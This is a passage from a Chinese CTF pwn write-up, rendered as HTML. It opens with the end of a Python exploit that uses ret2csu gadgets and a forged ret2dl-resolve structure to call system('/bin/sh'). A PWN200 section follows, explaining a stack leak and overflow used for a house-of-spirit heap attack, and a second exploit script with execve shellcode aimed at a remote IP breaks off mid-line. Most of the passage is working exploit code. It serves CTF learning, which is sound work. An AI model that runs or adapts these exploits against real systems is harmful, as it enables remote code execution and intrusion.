spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.rl()</code></div><div class="line number36 index35 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">leak(address,&nbsp;size):</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">count&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0</code></div><div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">buf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">''</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python plain">count&nbsp;&lt;&nbsp;size:</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">prepare(address&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">count)</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;leak(str(address&nbsp;+&nbsp;count))</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python color1">True</code><code class="python plain">:</code></div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">ch&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">io.read(</code><code class="python value">1</code><code class="python plain">,&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x10</code><code class="python plain">)</code></div><div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;ch</code></div><div class="line number45 index44 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">count&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python value">1</code></div><div class="line number46 index45 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">ch&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python string">'\n'</code><code class="python plain">:</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">buf&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'\x00'</code></div><div class="line number48 index47 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number50 index49 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">buf&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">ch[</code><code class="python value">0</code><code class="python plain">]</code></div><div class="line number51 index50 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;'{}&nbsp;==&gt;&nbsp;{}'.format(hex(address),&nbsp;leak_data.encode('hex'))</code></div><div class="line number52 index51 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">leak_data&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">buf[:size]</code></div><div class="line number53 index52 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">leak_data</code></div><div class="line number54 index53 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">com_gadget(part1,&nbsp;part2,&nbsp;jmp2,&nbsp;arg1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">,&nbsp;arg2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">,&nbsp;arg3&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">):</code></div><div class="line number55 index54 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(part1)&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;part1&nbsp;entry&nbsp;pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</code></div><div class="line number56 index55 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x0</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;rbx&nbsp;be&nbsp;0x0</code></div><div class="line number57 index56 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x1</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;rbp&nbsp;be&nbsp;0x1</code></div><div class="line number58 index57 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(jmp2)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r12&nbsp;jump&nbsp;to</code></div><div class="line number59 index58 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(arg3)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r13&nbsp;-&gt;&nbsp;rdx&nbsp;&nbsp;&nbsp;&nbsp;arg3</code></div><div class="line number60 index59 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(arg2)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r14&nbsp;-&gt;&nbsp;rsi&nbsp;&nbsp;&nbsp;&nbsp;arg2</code></div><div class="line number61 index60 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(arg1)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r15&nbsp;-&gt;&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;arg1</code></div><div class="line number62 index61 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(part2)&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;part2&nbsp;entry&nbsp;will&nbsp;call&nbsp;[rbx&nbsp;+&nbsp;r12&nbsp;+&nbsp;0x8]</code></div><div class="line number63 index62 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">56</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code class="python comments">#&nbsp;junk</code></div><div class="line number64 index63 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">payload</code></div><div class="line number65 index64 alt2"><code class="python plain">adr_linkmap&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(got_linkmap,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))</code></div><div class="line number66 index65 alt1"><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;leak&nbsp;link_map\t:\t'</code>&nbsp;<code class="python keyword">+</code>&nbsp;<code class="python functions">hex</code><code class="python plain">(adr_linkmap)</code></div><div class="line number67 index66 alt2"><code class="python comments">#&nbsp;overwrite&nbsp;link_map+0x1c8&nbsp;0x0,&nbsp;read&nbsp;fake&nbsp;structure</code></div><div class="line number68 index67 alt1"><code class="python plain">payload0&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python plain">junk</code></div><div class="line number69 index68 alt2"><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">com_gadget(com_part1,&nbsp;com_part2,&nbsp;got_read,</code></div><div class="line number70 index69 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">,</code></div><div class="line number71 index70 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_linkmap&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x1c8</code><code class="python plain">,</code></div><div class="line number72 index71 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg3&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x8</code><code class="python plain">)</code></div><div class="line number73 index72 alt2"><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(adr_entry)</code></div><div class="line number74 index73 alt1"><code class="python plain">payload0&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload0.ljust(</code><code class="python value">0xc8</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number75 index74 alt2"><code class="python plain">io.w(payload0)</code></div><div class="line number76 index75 alt1"><code class="python plain">io.rl()</code></div><div class="line number77 index76 alt2"><code class="python plain">io.w(l64(</code><code class="python value">0x0</code><code class="python plain">))</code></div><div class="line number78 index77 alt1"><code class="python plain">payload0&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python plain">junk</code></div><div class="line number79 index78 alt2"><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">com_gadget(com_part1,&nbsp;com_part2,&nbsp;got_read,</code></div><div class="line number80 index79 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">,</code></div><div class="line number81 index80 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_stage,</code></div><div class="line number82 index81 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg3&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x500</code><code class="python plain">)</code></div><div class="line number83 index82 alt2"><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(adr_entry)</code></div><div class="line number84 index83 alt1"><code class="python plain">payload0&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload0.ljust(</code><code class="python value">0xc8</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number85 index84 alt2"><code class="python plain">io.w(payload0)</code></div><div class="line number86 index85 alt1"><code class="python plain">io.rl()</code></div><div class="line number87 index86 alt2"><code class="python plain">payload0&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python plain">junk</code></div><div class="line number88 index87 alt1"><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(pop_rbp_ret)</code></div><div class="line number89 index88 alt2"><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(adr_stage)</code></div><div class="line number90 index89 alt1"><code class="python plain">payload0&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leave_ret)</code></div><div class="line number91 index90 alt2"><code class="python plain">payload0&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload0.ljust(</code><code class="python value">0xc8</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number92 index91 alt1"><code class="python comments">#&nbsp;fake&nbsp;structure</code></div><div class="line number93 index92 alt2"><code class="python plain">align_rel_plt&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x8</code><code class="python keyword">*</code><code class="python value">3</code>&nbsp;<code class="python keyword">-</code>&nbsp;<code class="python plain">(adr_fake_rel_plt&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python plain">adr_rel_plt)&nbsp;</code><code class="python keyword">%</code>&nbsp;<code class="python plain">(</code><code class="python value">0x8</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">3</code><code class="python plain">)</code></div><div class="line number94 index93 alt1"><code class="python plain">payload1&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x8</code></div><div class="line number95 index94 alt2"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(pop_rdi_ret)&nbsp;</code><code class="python comments">#&nbsp;set&nbsp;$rdi&nbsp;"/bin/sh"</code></div><div class="line number96 index95 alt1"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(adr_shell)</code></div><div class="line number97 index96 alt2"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(plt_resolve)</code></div><div class="line number98 index97 alt1"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64((adr_fake_rel_plt&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python plain">adr_rel_plt&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">align_rel_plt)&nbsp;</code><code class="python keyword">/</code>&nbsp;<code class="python plain">(</code><code class="python value">0x8</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">3</code><code class="python plain">))</code></div><div class="line number99 index98 alt2"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0xdeadbeef</code><code class="python plain">)</code></div><div class="line number100 index99 alt1"><code class="python plain">payload1&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload1.ljust(</code><code class="python value">0x100</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number101 index100 alt2"><code class="python plain">align_dyn_sym&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x8</code><code class="python keyword">*</code><code class="python value">3</code>&nbsp;<code class="python keyword">-</code>&nbsp;<code class="python plain">(adr_fake_dyn_sym&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python plain">adr_dyn_sym)&nbsp;</code><code class="python keyword">%</code>&nbsp;<code class="python plain">(</code><code class="python value">0x8</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">3</code><code class="python plain">)</code></div><div class="line number102 index101 alt1"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python plain">align_rel_plt</code></div><div class="line number103 index102 alt2"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(got_read)</code></div><div class="line number104 index103 alt1"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64((adr_fake_dyn_sym&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python plain">adr_dyn_sym&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">align_dyn_sym)</code><code class="python keyword">/</code><code class="python plain">(</code><code class="python value">0x8</code><code class="python keyword">*</code><code class="python value">3</code><code class="python plain">)</code><code class="python keyword">*</code><code class="python value">0x100000000</code>&nbsp;<code class="python keyword">+</code>&nbsp;<code class="python value">0x7</code><code class="python plain">)</code></div><div class="line number105 index104 alt2"><code class="python plain">payload1&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload1.ljust(</code><code class="python value">0x208</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number106 index105 alt1"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python plain">align_dyn_sym</code></div><div class="line number107 index106 alt2"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l32(adr_fake_dyn_str&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python plain">adr_dyn_str)</code></div><div class="line number108 index107 alt1"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l32(</code><code class="python value">0x12</code><code class="python plain">)</code></div><div class="line number109 index108 alt2"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x0</code><code class="python plain">)</code></div><div class="line number110 index109 alt1"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x0</code><code class="python plain">)</code></div><div class="line number111 index110 alt2"><code class="python plain">payload1&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload1.ljust(</code><code class="python value">0x300</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number112 index111 alt1"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'system\x00'</code></div><div class="line number113 index112 alt2"><code class="python plain">payload1&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload1.ljust(</code><code class="python value">0x400</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number114 index113 alt1"><code class="python plain">payload1&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'/bin/sh\x00'</code></div><div class="line number115 index114 alt2"><code class="python plain">payload1&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload1.ljust(</code><code class="python value">0x500</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number116 index115 alt1"><code class="python plain">io.w(payload1)</code></div><div class="line number117 index116 alt2"><code class="python plain">io.w(payload0)</code></div><div class="line number118 index117 alt1"><code class="python plain">io.rl()</code></div><div class="line number119 index118 alt2"><code class="python plain">io.interact()</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PWN200</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Bugs</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. 存在栈地址泄露</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. 在输入`money`时存在栈溢出，可覆盖`malloc`出的指针</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Thinking</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先泄露出栈地址，然后覆盖堆指针为栈上的可控区域，我们可以精巧的构造这块区域成一个伪造的堆块，之后通过free，这个堆块即被加入到了fastbin中，然后再通过malloc，即可对这个堆块的空间进行任意写，这时只要覆盖栈上的返回地址为一个jmp rsp，再通过一个short jmp，来执行shellcode，即可获得shell</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">另外，在构造堆块时，同时要构造好相邻的下一个堆块的头部，使得其prev_inuse == 1（在free的时候会检查）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">（其实这个漏洞利用的过程也叫house-of-spirit）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然而。事实上由于我的疏忽，可以直接覆盖指针为got表函数的地址，然后strcpy修改got表函数的地址，即可执行shellcode，sigh:(</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Exploit</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">zio&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python keyword">*</code></div><div class="line number2 index1 alt1"><code class="python plain">target&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'./pwn200'</code></div><div class="line number3 index2 alt2"><code class="python plain">target&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">(</code><code class="python string">'119.28.63.211'</code><code class="python plain">,&nbsp;</code><code class="python value">2333</code><code class="python plain">)</code></div><div class="line number4 index3 alt1"><code class="python plain">io&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">zio(target,&nbsp;print_read&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">COLORED(RAW,&nbsp;</code><code class="python string">'red'</code><code class="python plain">),&nbsp;print_write&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">COLORED(RAW,&nbsp;</code><code class="python string">'blue'</code><code class="python plain">),&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">10000</code><code class="python plain">)</code></div><div class="line number5 index4 alt2"><code class="python plain">io.rl()</code></div><div class="line number6 index5 alt1"><code class="python comments">#&nbsp;x86/bsd/exec:&nbsp;24&nbsp;bytes</code></div><div class="line number7 index6 alt2"><code class="python plain">shellcode&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">(</code></div><div class="line number8 index7 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"</code></div><div class="line number9 index8 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python string">"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</code></div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">)</code></div><div class="line number11 index10 alt2"><code class="python comments">#&nbsp;leak&nbsp;stack</code></div><div class="line number12 index11 alt1"><code class="python plain">fake&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">shellcode.ljust(</code><code class="python value">0x30</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;shellcode</code></div><div class="line number13 index12 alt2"><code class="python plain">io.w(fake)</code></div><div class="line number14 index13 alt1"><code class="python plain">io.rtl(</code><code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python plain">(</code><code class="python value">0x30</code>&nbsp;<code class="python keyword">-</code>&nbsp;<code class="python functions">len</code><code class="python plain">(shellcode)))</code></div><div class="line number15 index14 alt2"><code class="python plain">stack_ptr&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(io.rtl(</code><code class="python string">','</code><code class="python plain">)[:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">].ljust(</code><code class="python value">0x8</code><code class="python plain">,&nbsp;</code><code class="python string">'\x00'</code><code class="python plain">))&nbsp;</code><code class="python keyword">-</code>&nbsp;<code class="python value">0xb0</code></div><div class="line number16 index15 alt1"><code class="python functions">print</code>&nbsp;<code class="python string">'[+]&nbsp;leak&nbsp;stack&nbsp;pointer\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">stack_ptr</code></div><div class="line number17 index16 alt2"><code class="python plain">io.rtl(</code><code class="python string">'id&nbsp;~~?'</code><code class="python plain">)</code></div><div class="line number18 index17 alt1"><code class="python plain">io.wl(</code><code class="python value">0x20</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python 